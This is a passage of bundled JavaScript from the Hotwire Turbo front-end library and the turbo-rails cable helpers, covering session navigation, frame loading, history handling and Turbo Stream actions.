    requestErrored(fetchRequest) {
    }
    requestFinished(fetchRequest) {
    }
    requestPreventedHandlingResponse(fetchRequest, fetchResponse) {
    }
    requestFailedWithResponse(fetchRequest, fetchResponse) {
    }
    #preloadAll = () => {
      this.preloadOnLoadLinksForView(document.body);
    };
  };
  var Cache = class {
    constructor(session2) {
      this.session = session2;
    }
    clear() {
      this.session.clearCache();
    }
    resetCacheControl() {
      this.#setCacheControl("");
    }
    exemptPageFromCache() {
      this.#setCacheControl("no-cache");
    }
    exemptPageFromPreview() {
      this.#setCacheControl("no-preview");
    }
    #setCacheControl(value) {
      setMetaContent("turbo-cache-control", value);
    }
  };
  var Session = class {
    navigator = new Navigator(this);
    history = new History(this);
    view = new PageView(this, document.documentElement);
    adapter = new BrowserAdapter(this);
    pageObserver = new PageObserver(this);
    cacheObserver = new CacheObserver();
    linkClickObserver = new LinkClickObserver(this, window);
    formSubmitObserver = new FormSubmitObserver(this, document);
    scrollObserver = new ScrollObserver(this);
    streamObserver = new StreamObserver(this);
    formLinkClickObserver = new FormLinkClickObserver(this, document.documentElement);
    frameRedirector = new FrameRedirector(this, document.documentElement);
    streamMessageRenderer = new StreamMessageRenderer();
    cache = new Cache(this);
    drive = true;
    enabled = true;
    progressBarDelay = 500;
    started = false;
    formMode = "on";
    constructor(recentRequests2) {
      this.recentRequests = recentRequests2;
      this.preloader = new Preloader(this, this.view.snapshotCache);
    }
    start() {
      if (!this.started) {
        this.pageObserver.start();
        this.cacheObserver.start();
        this.formLinkClickObserver.start();
        this.linkClickObserver.start();
        this.formSubmitObserver.start();
        this.scrollObserver.start();
        this.streamObserver.start();
        this.frameRedirector.start();
        this.history.start();
        this.preloader.start();
        this.started = true;
        this.enabled = true;
      }
    }
    disable() {
      this.enabled = false;
    }
    stop() {
      if (this.started) {
        this.pageObserver.stop();
        this.cacheObserver.stop();
        this.formLinkClickObserver.stop();
        this.linkClickObserver.stop();
        this.formSubmitObserver.stop();
        this.scrollObserver.stop();
        this.streamObserver.stop();
        this.frameRedirector.stop();
        this.history.stop();
        this.preloader.stop();
        this.started = false;
      }
    }
    registerAdapter(adapter) {
      this.adapter = adapter;
    }
    visit(location2, options = {}) {
      const frameElement = options.frame ? document.getElementById(options.frame) : null;
      if (frameElement instanceof FrameElement) {
        frameElement.src = location2.toString();
        frameElement.loaded;
      } else {
        this.navigator.proposeVisit(expandURL(location2), options);
      }
    }
    refresh(url, requestId) {
      const isRecentRequest = requestId && this.recentRequests.has(requestId);
      if (!isRecentRequest) {
        this.cache.exemptPageFromPreview();
        this.visit(url, { action: "replace" });
      }
    }
    connectStreamSource(source) {
      this.streamObserver.connectStreamSource(source);
    }
    disconnectStreamSource(source) {
      this.streamObserver.disconnectStreamSource(source);
    }
    renderStreamMessage(message) {
      this.streamMessageRenderer.render(StreamMessage.wrap(message));
    }
    clearCache() {
      this.view.clearSnapshotCache();
    }
    setProgressBarDelay(delay) {
      this.progressBarDelay = delay;
    }
    setFormMode(mode) {
      this.formMode = mode;
    }
    get location() {
      return this.history.location;
    }
    get restorationIdentifier() {
      return this.history.restorationIdentifier;
    }
    // Preloader delegate
    shouldPreloadLink(element) {
      const isUnsafe = element.hasAttribute("data-turbo-method");
      const isStream2 = element.hasAttribute("data-turbo-stream");
      const frameTarget = element.getAttribute("data-turbo-frame");
      const frame = frameTarget == "_top" ? null : document.getElementById(frameTarget) || findClosestRecursively(element, "turbo-frame:not([disabled])");
      if (isUnsafe || isStream2 || frame instanceof FrameElement) {
        return false;
      } else {
        const location2 = new URL(element.href);
        return this.elementIsNavigatable(element) && locationIsVisitable(location2, this.snapshot.rootLocation);
      }
    }
    // History delegate
    historyPoppedToLocationWithRestorationIdentifierAndDirection(location2, restorationIdentifier, direction) {
      if (this.enabled) {
        this.navigator.startVisit(location2, restorationIdentifier, {
          action: "restore",
          historyChanged: true,
          direction
        });
      } else {
        this.adapter.pageInvalidated({
          reason: "turbo_disabled"
        });
      }
    }
    // Scroll observer delegate
    scrollPositionChanged(position) {
      this.history.updateRestorationData({ scrollPosition: position });
    }
    // Form click observer delegate
    willSubmitFormLinkToLocation(link, location2) {
      return this.elementIsNavigatable(link) && locationIsVisitable(location2, this.snapshot.rootLocation);
    }
    submittedFormLinkToLocation() {
    }
    // Link click observer delegate
    willFollowLinkToLocation(link, location2, event) {
      return this.elementIsNavigatable(link) && locationIsVisitable(location2, this.snapshot.rootLocation) && this.applicationAllowsFollowingLinkToLocation(link, location2, event);
    }
    followedLinkToLocation(link, location2) {
      const action = this.getActionForLink(link);
      const acceptsStreamResponse = link.hasAttribute("data-turbo-stream");
      this.visit(location2.href, { action, acceptsStreamResponse });
    }
    // Navigator delegate
    allowsVisitingLocationWithAction(location2, action) {
      return this.locationWithActionIsSamePage(location2, action) || this.applicationAllowsVisitingLocation(location2);
    }
    visitProposedToLocation(location2, options) {
      extendURLWithDeprecatedProperties(location2);
      this.adapter.visitProposedToLocation(location2, options);
    }
    // Visit delegate
    visitStarted(visit2) {
      if (!visit2.acceptsStreamResponse) {
        markAsBusy(document.documentElement);
        this.view.markVisitDirection(visit2.direction);
      }
      extendURLWithDeprecatedProperties(visit2.location);
      if (!visit2.silent) {
        this.notifyApplicationAfterVisitingLocation(visit2.location, visit2.action);
      }
    }
    visitCompleted(visit2) {
      this.view.unmarkVisitDirection();
      clearBusyState(document.documentElement);
      this.notifyApplicationAfterPageLoad(visit2.getTimingMetrics());
    }
    locationWithActionIsSamePage(location2, action) {
      return this.navigator.locationWithActionIsSamePage(location2, action);
    }
    visitScrolledToSamePageLocation(oldURL, newURL) {
      this.notifyApplicationAfterVisitingSamePageLocation(oldURL, newURL);
    }
    // Form submit observer delegate
    willSubmitForm(form, submitter) {
      const action = getAction$1(form, submitter);
      return this.submissionIsNavigatable(form, submitter) && locationIsVisitable(expandURL(action), this.snapshot.rootLocation);
    }
    formSubmitted(form, submitter) {
      this.navigator.submitForm(form, submitter);
    }
    // Page observer delegate
    pageBecameInteractive() {
      this.view.lastRenderedLocation = this.location;
      this.notifyApplicationAfterPageLoad();
    }
    pageLoaded() {
      this.history.assumeControlOfScrollRestoration();
    }
    pageWillUnload() {
      this.history.relinquishControlOfScrollRestoration();
    }
    // Stream observer delegate
    receivedMessageFromStream(message) {
      this.renderStreamMessage(message);
    }
    // Page view delegate
    viewWillCacheSnapshot() {
      if (!this.navigator.currentVisit?.silent) {
        this.notifyApplicationBeforeCachingSnapshot();
      }
    }
    allowsImmediateRender({ element }, isPreview, options) {
      const event = this.notifyApplicationBeforeRender(element, isPreview, options);
      const {
        defaultPrevented,
        detail: { render }
      } = event;
      if (this.view.renderer && render) {
        this.view.renderer.renderElement = render;
      }
      return !defaultPrevented;
    }
    viewRenderedSnapshot(_snapshot, isPreview, renderMethod) {
      this.view.lastRenderedLocation = this.history.location;
      this.notifyApplicationAfterRender(isPreview, renderMethod);
    }
    preloadOnLoadLinksForView(element) {
      this.preloader.preloadOnLoadLinksForView(element);
    }
    viewInvalidated(reason) {
      this.adapter.pageInvalidated(reason);
    }
    // Frame element
    frameLoaded(frame) {
      this.notifyApplicationAfterFrameLoad(frame);
    }
    frameRendered(fetchResponse, frame) {
      this.notifyApplicationAfterFrameRender(fetchResponse, frame);
    }
    // Application events
    applicationAllowsFollowingLinkToLocation(link, location2, ev) {
      const event = this.notifyApplicationAfterClickingLinkToLocation(link, location2, ev);
      return !event.defaultPrevented;
    }
    applicationAllowsVisitingLocation(location2) {
      const event = this.notifyApplicationBeforeVisitingLocation(location2);
      return !event.defaultPrevented;
    }
    notifyApplicationAfterClickingLinkToLocation(link, location2, event) {
      return dispatch("turbo:click", {
        target: link,
        detail: { url: location2.href, originalEvent: event },
        cancelable: true
      });
    }
    notifyApplicationBeforeVisitingLocation(location2) {
      return dispatch("turbo:before-visit", {
        detail: { url: location2.href },
        cancelable: true
      });
    }
    notifyApplicationAfterVisitingLocation(location2, action) {
      return dispatch("turbo:visit", { detail: { url: location2.href, action } });
    }
    notifyApplicationBeforeCachingSnapshot() {
      return dispatch("turbo:before-cache");
    }
    notifyApplicationBeforeRender(newBody, isPreview, options) {
      return dispatch("turbo:before-render", {
        detail: { newBody, isPreview, ...options },
        cancelable: true
      });
    }
    notifyApplicationAfterRender(isPreview, renderMethod) {
      return dispatch("turbo:render", { detail: { isPreview, renderMethod } });
    }
    notifyApplicationAfterPageLoad(timing = {}) {
      return dispatch("turbo:load", {
        detail: { url: this.location.href, timing }
      });
    }
    notifyApplicationAfterVisitingSamePageLocation(oldURL, newURL) {
      dispatchEvent(
        new HashChangeEvent("hashchange", {
          oldURL: oldURL.toString(),
          newURL: newURL.toString()
        })
      );
    }
    notifyApplicationAfterFrameLoad(frame) {
      return dispatch("turbo:frame-load", { target: frame });
    }
    notifyApplicationAfterFrameRender(fetchResponse, frame) {
      return dispatch("turbo:frame-render", {
        detail: { fetchResponse },
        target: frame,
        cancelable: true
      });
    }
    // Helpers
    submissionIsNavigatable(form, submitter) {
      if (this.formMode == "off") {
        return false;
      } else {
        const submitterIsNavigatable = submitter ? this.elementIsNavigatable(submitter) : true;
        if (this.formMode == "optin") {
          return submitterIsNavigatable && form.closest('[data-turbo="true"]') != null;
        } else {
          return submitterIsNavigatable && this.elementIsNavigatable(form);
        }
      }
    }
    elementIsNavigatable(element) {
      const container = findClosestRecursively(element, "[data-turbo]");
      const withinFrame = findClosestRecursively(element, "turbo-frame");
      if (this.drive || withinFrame) {
        if (container) {
          return container.getAttribute("data-turbo") != "false";
        } else {
          return true;
        }
      } else {
        if (container) {
          return container.getAttribute("data-turbo") == "true";
        } else {
          return false;
        }
      }
    }
    // Private
    getActionForLink(link) {
      return getVisitAction(link) || "advance";
    }
    get snapshot() {
      return this.view.snapshot;
    }
  };
  function extendURLWithDeprecatedProperties(url) {
    Object.defineProperties(url, deprecatedLocationPropertyDescriptors);
  }
  var deprecatedLocationPropertyDescriptors = {
    absoluteURL: {
      get() {
        return this.toString();
      }
    }
  };
  var session = new Session(recentRequests);
  var { cache, navigator: navigator$1 } = session;
  function start() {
    session.start();
  }
  function registerAdapter(adapter) {
    session.registerAdapter(adapter);
  }
  function visit(location2, options) {
    session.visit(location2, options);
  }
  function connectStreamSource(source) {
    session.connectStreamSource(source);
  }
  function disconnectStreamSource(source) {
    session.disconnectStreamSource(source);
  }
  function renderStreamMessage(message) {
    session.renderStreamMessage(message);
  }
  function clearCache() {
    console.warn(
      "Please replace `Turbo.clearCache()` with `Turbo.cache.clear()`. The top-level function is deprecated and will be removed in a future version of Turbo.`"
    );
    session.clearCache();
  }
  function setProgressBarDelay(delay) {
    session.setProgressBarDelay(delay);
  }
  function setConfirmMethod(confirmMethod) {
    FormSubmission.confirmMethod = confirmMethod;
  }
  function setFormMode(mode) {
    session.setFormMode(mode);
  }
  var Turbo2 = /* @__PURE__ */ Object.freeze({
    __proto__: null,
    navigator: navigator$1,
    session,
    cache,
    PageRenderer,
    PageSnapshot,
    FrameRenderer,
    fetch: fetchWithTurboHeaders,
    start,
    registerAdapter,
    visit,
    connectStreamSource,
    disconnectStreamSource,
    renderStreamMessage,
    clearCache,
    setProgressBarDelay,
    setConfirmMethod,
    setFormMode
  });
  var TurboFrameMissingError = class extends Error {
  };
  var FrameController = class {
    fetchResponseLoaded = (_fetchResponse) => Promise.resolve();
    #currentFetchRequest = null;
    #resolveVisitPromise = () => {
    };
    #connected = false;
    #hasBeenLoaded = false;
    #ignoredAttributes = /* @__PURE__ */ new Set();
    action = null;
    constructor(element) {
      this.element = element;
      this.view = new FrameView(this, this.element);
      this.appearanceObserver = new AppearanceObserver(this, this.element);
      this.formLinkClickObserver = new FormLinkClickObserver(this, this.element);
      this.linkInterceptor = new LinkInterceptor(this, this.element);
      this.restorationIdentifier = uuid();
      this.formSubmitObserver = new FormSubmitObserver(this, this.element);
    }
    // Frame delegate
    connect() {
      if (!this.#connected) {
        this.#connected = true;
        if (this.loadingStyle == FrameLoadingStyle.lazy) {
          this.appearanceObserver.start();
        } else {
          this.#loadSourceURL();
        }
        this.formLinkClickObserver.start();
        this.linkInterceptor.start();
        this.formSubmitObserver.start();
      }
    }
    disconnect() {
      if (this.#connected) {
        this.#connected = false;
        this.appearanceObserver.stop();
        this.formLinkClickObserver.stop();
        this.linkInterceptor.stop();
        this.formSubmitObserver.stop();
      }
    }
    disabledChanged() {
      if (this.loadingStyle == FrameLoadingStyle.eager) {
        this.#loadSourceURL();
      }
    }
    sourceURLChanged() {
      if (this.#isIgnoringChangesTo("src"))
        return;
      if (this.element.isConnected) {
        this.complete = false;
      }
      if (this.loadingStyle == FrameLoadingStyle.eager || this.#hasBeenLoaded) {
        this.#loadSourceURL();
      }
    }
    sourceURLReloaded() {
      const { src } = this.element;
      this.#ignoringChangesToAttribute("complete", () => {
        this.element.removeAttribute("complete");
      });
      this.element.src = null;
      this.element.src = src;
      return this.element.loaded;
    }
    completeChanged() {
      if (this.#isIgnoringChangesTo("complete"))
        return;
      this.#loadSourceURL();
    }
    loadingStyleChanged() {
      if (this.loadingStyle == FrameLoadingStyle.lazy) {
        this.appearanceObserver.start();
      } else {
        this.appearanceObserver.stop();
        this.#loadSourceURL();
      }
    }
    async #loadSourceURL() {
      if (this.enabled && this.isActive && !this.complete && this.sourceURL) {
        this.element.loaded = this.#visit(expandURL(this.sourceURL));
        this.appearanceObserver.stop();
        await this.element.loaded;
        this.#hasBeenLoaded = true;
      }
    }
    async loadResponse(fetchResponse) {
      if (fetchResponse.redirected || fetchResponse.succeeded && fetchResponse.isHTML) {
        this.sourceURL = fetchResponse.response.url;
      }
      try {
        const html = await fetchResponse.responseHTML;
        if (html) {
          const document2 = parseHTMLDocument(html);
          const pageSnapshot = PageSnapshot.fromDocument(document2);
          if (pageSnapshot.isVisitable) {
            await this.#loadFrameResponse(fetchResponse, document2);
          } else {
            await this.#handleUnvisitableFrameResponse(fetchResponse);
          }
        }
      } finally {
        this.fetchResponseLoaded = () => Promise.resolve();
      }
    }
    // Appearance observer delegate
    elementAppearedInViewport(element) {
      this.proposeVisitIfNavigatedWithAction(element, element);
      this.#loadSourceURL();
    }
    // Form link click observer delegate
    willSubmitFormLinkToLocation(link) {
      return this.#shouldInterceptNavigation(link);
    }
    submittedFormLinkToLocation(link, _location, form) {
      const frame = this.#findFrameElement(link);
      if (frame)
        form.setAttribute("data-turbo-frame", frame.id);
    }
    // Link interceptor delegate
    shouldInterceptLinkClick(element, _location, _event) {
      return this.#shouldInterceptNavigation(element);
    }
    linkClickIntercepted(element, location2) {
      this.#navigateFrame(element, location2);
    }
    // Form submit observer delegate
    willSubmitForm(element, submitter) {
      return element.closest("turbo-frame") == this.element && this.#shouldInterceptNavigation(element, submitter);
    }
    formSubmitted(element, submitter) {
      if (this.formSubmission) {
        this.formSubmission.stop();
      }
      this.formSubmission = new FormSubmission(this, element, submitter);
      const { fetchRequest } = this.formSubmission;
      this.prepareRequest(fetchRequest);
      this.formSubmission.start();
    }
    // Fetch request delegate
    prepareRequest(request) {
      request.headers["Turbo-Frame"] = this.id;
      if (this.currentNavigationElement?.hasAttribute("data-turbo-stream")) {
        request.acceptResponseType(StreamMessage.contentType);
      }
    }
    requestStarted(_request) {
      markAsBusy(this.element);
    }
    requestPreventedHandlingResponse(_request, _response) {
      this.#resolveVisitPromise();
    }
    async requestSucceededWithResponse(request, response) {
      await this.loadResponse(response);
      this.#resolveVisitPromise();
    }
    async requestFailedWithResponse(request, response) {
      await this.loadResponse(response);
      this.#resolveVisitPromise();
    }
    requestErrored(request, error2) {
      console.error(error2);
      this.#resolveVisitPromise();
    }
    requestFinished(_request) {
      clearBusyState(this.element);
    }
    // Form submission delegate
    formSubmissionStarted({ formElement }) {
      markAsBusy(formElement, this.#findFrameElement(formElement));
    }
    formSubmissionSucceededWithResponse(formSubmission, response) {
      const frame = this.#findFrameElement(formSubmission.formElement, formSubmission.submitter);
      frame.delegate.proposeVisitIfNavigatedWithAction(frame, formSubmission.formElement, formSubmission.submitter);
      frame.delegate.loadResponse(response);
      if (!formSubmission.isSafe) {
        session.clearCache();
      }
    }
    formSubmissionFailedWithResponse(formSubmission, fetchResponse) {
      this.element.delegate.loadResponse(fetchResponse);
      session.clearCache();
    }
    formSubmissionErrored(formSubmission, error2) {
      console.error(error2);
    }
    formSubmissionFinished({ formElement }) {
      clearBusyState(formElement, this.#findFrameElement(formElement));
    }
    // View delegate
    allowsImmediateRender({ element: newFrame }, _isPreview, options) {
      const event = dispatch("turbo:before-frame-render", {
        target: this.element,
        detail: { newFrame, ...options },
        cancelable: true
      });
      const {
        defaultPrevented,
        detail: { render }
      } = event;
      if (this.view.renderer && render) {
        this.view.renderer.renderElement = render;
      }
      return !defaultPrevented;
    }
    viewRenderedSnapshot(_snapshot, _isPreview, _renderMethod) {
    }
    preloadOnLoadLinksForView(element) {
      session.preloadOnLoadLinksForView(element);
    }
    viewInvalidated() {
    }
    // Frame renderer delegate
    willRenderFrame(currentElement, _newElement) {
      this.previousFrameElement = currentElement.cloneNode(true);
    }
    visitCachedSnapshot = ({ element }) => {
      const frame = element.querySelector("#" + this.element.id);
      if (frame && this.previousFrameElement) {
        frame.replaceChildren(...this.previousFrameElement.children);
      }
      delete this.previousFrameElement;
    };
    // Private
    async #loadFrameResponse(fetchResponse, document2) {
      const newFrameElement = await this.extractForeignFrameElement(document2.body);
      if (newFrameElement) {
        const snapshot = new Snapshot(newFrameElement);
        const renderer = new FrameRenderer(this, this.view.snapshot, snapshot, FrameRenderer.renderElement, false, false);
        if (this.view.renderPromise)
          await this.view.renderPromise;
        this.changeHistory();
        await this.view.render(renderer);
        this.complete = true;
        session.frameRendered(fetchResponse, this.element);
        session.frameLoaded(this.element);
        await this.fetchResponseLoaded(fetchResponse);
      } else if (this.#willHandleFrameMissingFromResponse(fetchResponse)) {
        this.#handleFrameMissingFromResponse(fetchResponse);
      }
    }
    async #visit(url) {
      const request = new FetchRequest(this, FetchMethod.get, url, new URLSearchParams(), this.element);
      this.#currentFetchRequest?.cancel();
      this.#currentFetchRequest = request;
      return new Promise((resolve) => {
        this.#resolveVisitPromise = () => {
          this.#resolveVisitPromise = () => {
          };
          this.#currentFetchRequest = null;
          resolve();
        };
        request.perform();
      });
    }
    #navigateFrame(element, url, submitter) {
      const frame = this.#findFrameElement(element, submitter);
      frame.delegate.proposeVisitIfNavigatedWithAction(frame, element, submitter);
      this.#withCurrentNavigationElement(element, () => {
        frame.src = url;
      });
    }
    proposeVisitIfNavigatedWithAction(frame, element, submitter) {
      this.action = getVisitAction(submitter, element, frame);
      if (this.action) {
        const pageSnapshot = PageSnapshot.fromElement(frame).clone();
        const { visitCachedSnapshot } = frame.delegate;
        frame.delegate.fetchResponseLoaded = async (fetchResponse) => {
          if (frame.src) {
            const { statusCode, redirected } = fetchResponse;
            const responseHTML = await fetchResponse.responseHTML;
            const response = { statusCode, redirected, responseHTML };
            const options = {
              response,
              visitCachedSnapshot,
              willRender: false,
              updateHistory: false,
              restorationIdentifier: this.restorationIdentifier,
              snapshot: pageSnapshot
            };
            if (this.action)
              options.action = this.action;
            session.visit(frame.src, options);
          }
        };
      }
    }
    changeHistory() {
      if (this.action) {
        const method = getHistoryMethodForAction(this.action);
        session.history.update(method, expandURL(this.element.src || ""), this.restorationIdentifier);
      }
    }
    async #handleUnvisitableFrameResponse(fetchResponse) {
      console.warn(
        `The response (${fetchResponse.statusCode}) from <turbo-frame id="${this.element.id}"> is performing a full page visit due to turbo-visit-control.`
      );
      await this.#visitResponse(fetchResponse.response);
    }
    #willHandleFrameMissingFromResponse(fetchResponse) {
      this.element.setAttribute("complete", "");
      const response = fetchResponse.response;
      const visit2 = async (url, options) => {
        if (url instanceof Response) {
          this.#visitResponse(url);
        } else {
          session.visit(url, options);
        }
      };
      const event = dispatch("turbo:frame-missing", {
        target: this.element,
        detail: { response, visit: visit2 },
        cancelable: true
      });
      return !event.defaultPrevented;
    }
    #handleFrameMissingFromResponse(fetchResponse) {
      this.view.missing();
      this.#throwFrameMissingError(fetchResponse);
    }
    #throwFrameMissingError(fetchResponse) {
      const message = `The response (${fetchResponse.statusCode}) did not contain the expected <turbo-frame id="${this.element.id}"> and will be ignored. To perform a full page visit instead, set turbo-visit-control to reload.`;
      throw new TurboFrameMissingError(message);
    }
    async #visitResponse(response) {
      const wrapped = new FetchResponse(response);
      const responseHTML = await wrapped.responseHTML;
      const { location: location2, redirected, statusCode } = wrapped;
      return session.visit(location2, { response: { redirected, statusCode, responseHTML } });
    }
    #findFrameElement(element, submitter) {
      const id = getAttribute("data-turbo-frame", submitter, element) || this.element.getAttribute("target");
      return getFrameElementById(id) ?? this.element;
    }
    async extractForeignFrameElement(container) {
      let element;
      const id = CSS.escape(this.id);
      try {
        element = activateElement(container.querySelector(`turbo-frame#${id}`), this.sourceURL);
        if (element) {
          return element;
        }
        element = activateElement(container.querySelector(`turbo-frame[src][recurse~=${id}]`), this.sourceURL);
        if (element) {
          await element.loaded;
          return await this.extractForeignFrameElement(element);
        }
      } catch (error2) {
        console.error(error2);
        return new FrameElement();
      }
      return null;
    }
    #formActionIsVisitable(form, submitter) {
      const action = getAction$1(form, submitter);
      return locationIsVisitable(expandURL(action), this.rootLocation);
    }
    #shouldInterceptNavigation(element, submitter) {
      const id = getAttribute("data-turbo-frame", submitter, element) || this.element.getAttribute("target");
      if (element instanceof HTMLFormElement && !this.#formActionIsVisitable(element, submitter)) {
        return false;
      }
      if (!this.enabled || id == "_top") {
        return false;
      }
      if (id) {
        const frameElement = getFrameElementById(id);
        if (frameElement) {
          return !frameElement.disabled;
        }
      }
      if (!session.elementIsNavigatable(element)) {
        return false;
      }
      if (submitter && !session.elementIsNavigatable(submitter)) {
        return false;
      }
      return true;
    }
    // Computed properties
    get id() {
      return this.element.id;
    }
    get enabled() {
      return !this.element.disabled;
    }
    get sourceURL() {
      if (this.element.src) {
        return this.element.src;
      }
    }
    set sourceURL(sourceURL) {
      this.#ignoringChangesToAttribute("src", () => {
        this.element.src = sourceURL ?? null;
      });
    }
    get loadingStyle() {
      return this.element.loading;
    }
    get isLoading() {
      return this.formSubmission !== void 0 || this.#resolveVisitPromise() !== void 0;
    }
    get complete() {
      return this.element.hasAttribute("complete");
    }
    set complete(value) {
      this.#ignoringChangesToAttribute("complete", () => {
        if (value) {
          this.element.setAttribute("complete", "");
        } else {
          this.element.removeAttribute("complete");
        }
      });
    }
    get isActive() {
      return this.element.isActive && this.#connected;
    }
    get rootLocation() {
      const meta = this.element.ownerDocument.querySelector(`meta[name="turbo-root"]`);
      const root2 = meta?.content ?? "/";
      return expandURL(root2);
    }
    #isIgnoringChangesTo(attributeName) {
      return this.#ignoredAttributes.has(attributeName);
    }
    #ignoringChangesToAttribute(attributeName, callback) {
      this.#ignoredAttributes.add(attributeName);
      callback();
      this.#ignoredAttributes.delete(attributeName);
    }
    #withCurrentNavigationElement(element, callback) {
      this.currentNavigationElement = element;
      callback();
      delete this.currentNavigationElement;
    }
  };
  function getFrameElementById(id) {
    if (id != null) {
      const element = document.getElementById(id);
      if (element instanceof FrameElement) {
        return element;
      }
    }
  }
  function activateElement(element, currentURL) {
    if (element) {
      const src = element.getAttribute("src");
      if (src != null && currentURL != null && urlsAreEqual(src, currentURL)) {
        throw new Error(`Matching <turbo-frame id="${element.id}"> element has a source URL which references itself`);
      }
      if (element.ownerDocument !== document) {
        element = document.importNode(element, true);
      }
      if (element instanceof FrameElement) {
        element.connectedCallback();
        element.disconnectedCallback();
        return element;
      }
    }
  }
  var StreamActions = {
    after() {
      this.targetElements.forEach((e) => e.parentElement?.insertBefore(this.templateContent, e.nextSibling));
    },
    append() {
      this.removeDuplicateTargetChildren();
      this.targetElements.forEach((e) => e.append(this.templateContent));
    },
    before() {
      this.targetElements.forEach((e) => e.parentElement?.insertBefore(this.templateContent, e));
    },
    prepend() {
      this.removeDuplicateTargetChildren();
      this.targetElements.forEach((e) => e.prepend(this.templateContent));
    },
    remove() {
      this.targetElements.forEach((e) => e.remove());
    },
    replace() {
      this.targetElements.forEach((e) => e.replaceWith(this.templateContent));
    },
    update() {
      this.targetElements.forEach((targetElement) => {
        targetElement.innerHTML = "";
        targetElement.append(this.templateContent);
      });
    },
    refresh() {
      session.refresh(this.baseURI, this.requestId);
    }
  };
  var StreamElement = class _StreamElement extends HTMLElement {
    static async renderElement(newElement) {
      await newElement.performAction();
    }
    async connectedCallback() {
      try {
        await this.render();
      } catch (error2) {
        console.error(error2);
      } finally {
        this.disconnect();
      }
    }
    async render() {
      return this.renderPromise ??= (async () => {
        const event = this.beforeRenderEvent;
        if (this.dispatchEvent(event)) {
          await nextRepaint();
          await event.detail.render(this);
        }
      })();
    }
    disconnect() {
      try {
        this.remove();
      } catch {
      }
    }
    /**
     * Removes duplicate children (by ID)
     */
    removeDuplicateTargetChildren() {
      this.duplicateChildren.forEach((c) => c.remove());
    }
    /**
     * Gets the list of duplicate children (i.e. those with the same ID)
     */
    get duplicateChildren() {
      const existingChildren = this.targetElements.flatMap((e) => [...e.children]).filter((c) => !!c.id);
      const newChildrenIds = [...this.templateContent?.children || []].filter((c) => !!c.id).map((c) => c.id);
      return existingChildren.filter((c) => newChildrenIds.includes(c.id));
    }
    /**
     * Gets the action function to be performed.
     */
    get performAction() {
      if (this.action) {
        const actionFunction = StreamActions[this.action];
        if (actionFunction) {
          return actionFunction;
        }
        this.#raise("unknown action");
      }
      this.#raise("action attribute is missing");
    }
    /**
     * Gets the target elements which the template will be rendered to.
     */
    get targetElements() {
      if (this.target) {
        return this.targetElementsById;
      } else if (this.targets) {
        return this.targetElementsByQuery;
      } else {
        this.#raise("target or targets attribute is missing");
      }
    }
    /**
     * Gets the contents of the main `<template>`.
     */
    get templateContent() {
      return this.templateElement.content.cloneNode(true);
    }
    /**
     * Gets the main `<template>` used for rendering
     */
    get templateElement() {
      if (this.firstElementChild === null) {
        const template = this.ownerDocument.createElement("template");
        this.appendChild(template);
        return template;
      } else if (this.firstElementChild instanceof HTMLTemplateElement) {
        return this.firstElementChild;
      }
      this.#raise("first child element must be a <template> element");
    }
    /**
     * Gets the current action.
     */
    get action() {
      return this.getAttribute("action");
    }
    /**
     * Gets the current target (an element ID) to which the result will
     * be rendered.
     */
    get target() {
      return this.getAttribute("target");
    }
    /**
     * Gets the current "targets" selector (a CSS selector)
     */
    get targets() {
      return this.getAttribute("targets");
    }
    /**
     * Reads the request-id attribute
     */
    get requestId() {
      return this.getAttribute("request-id");
    }
    #raise(message) {
      throw new Error(`${this.description}: ${message}`);
    }
    get description() {
      return (this.outerHTML.match(/<[^>]+>/) ?? [])[0] ?? "<turbo-stream>";
    }
    get beforeRenderEvent() {
      return new CustomEvent("turbo:before-stream-render", {
        bubbles: true,
        cancelable: true,
        detail: { newStream: this, render: _StreamElement.renderElement }
      });
    }
    get targetElementsById() {
      const element = this.ownerDocument?.getElementById(this.target);
      if (element !== null) {
        return [element];
      } else {
        return [];
      }
    }
    get targetElementsByQuery() {
      const elements = this.ownerDocument?.querySelectorAll(this.targets);
      if (elements.length !== 0) {
        return Array.prototype.slice.call(elements);
      } else {
        return [];
      }
    }
  };
  var StreamSourceElement = class extends HTMLElement {
    streamSource = null;
    connectedCallback() {
      this.streamSource = this.src.match(/^ws{1,2}:/) ? new WebSocket(this.src) : new EventSource(this.src);
      connectStreamSource(this.streamSource);
    }
    disconnectedCallback() {
      if (this.streamSource) {
        this.streamSource.close();
        disconnectStreamSource(this.streamSource);
      }
    }
    get src() {
      return this.getAttribute("src") || "";
    }
  };
  FrameElement.delegateConstructor = FrameController;
  if (customElements.get("turbo-frame") === void 0) {
    customElements.define("turbo-frame", FrameElement);
  }
  if (customElements.get("turbo-stream") === void 0) {
    customElements.define("turbo-stream", StreamElement);
  }
  if (customElements.get("turbo-stream-source") === void 0) {
    customElements.define("turbo-stream-source", StreamSourceElement);
  }
  (() => {
    let element = document.currentScript;
    if (!element)
      return;
    if (element.hasAttribute("data-turbo-suppress-warning"))
      return;
    element = element.parentElement;
    while (element) {
      if (element == document.body) {
        return console.warn(
          unindent`
        You are loading Turbo from a <script> element inside the <body> element. This is probably not what you meant to do!

        Load your application’s JavaScript bundle inside the <head> element instead. <script> elements in <body> are evaluated with each page change.

        For more information, see: https://turbo.hotwired.dev/handbook/building#working-with-script-elements

        ——
        Suppress this warning by adding a "data-turbo-suppress-warning" attribute to: %s
      `,
          element.outerHTML
        );
      }
      element = element.parentElement;
    }
  })();
  window.Turbo = { ...Turbo2, StreamActions };
  start();

  // node_modules/@hotwired/turbo-rails/app/javascript/turbo/cable.js
  var consumer;
  async function getConsumer() {
    return consumer || setConsumer(createConsumer2().then(setConsumer));
  }
  function setConsumer(newConsumer) {
    return consumer = newConsumer;
  }
  async function createConsumer2() {
    const { createConsumer: createConsumer3 } = await Promise.resolve().then(() => (init_src(), src_exports));
    return createConsumer3();
  }
  async function subscribeTo(channel, mixin) {
    const { subscriptions } = await getConsumer();
    return subscriptions.create(channel, mixin);
  }

  // node_modules/@hotwired/turbo-rails/app/javascript/turbo/snakeize.js
  function walk(obj) {
    if (!obj || typeof obj !== "object")
      return obj;
    if (obj instanceof Date || obj instanceof RegExp)
      return obj;
    if (Array.isArray(obj))
      return obj.map(walk);
    return Object.keys(obj).reduce(function(acc, key) {
      var camel = key[0].toLowerCase() + key.slice(1).replace(/([A-Z]+)/g, function(m, x) {
        return "_" + x.toLowerCase();
      });
      acc[camel] = walk(obj[key]);
      return acc;
    }, {});
  }

  // node_modules/@hotwired/turbo-rails/app/javascript/turbo/cable_stream_source_element.js
  var TurboCableStreamSourceElement = class extends HTMLElement {
    async connectedCallback() {
      connectStreamSource(this);
      this.subscription = await subscribeTo(this.channel, {
        received: this.dispatchMessageEvent.bind(this),
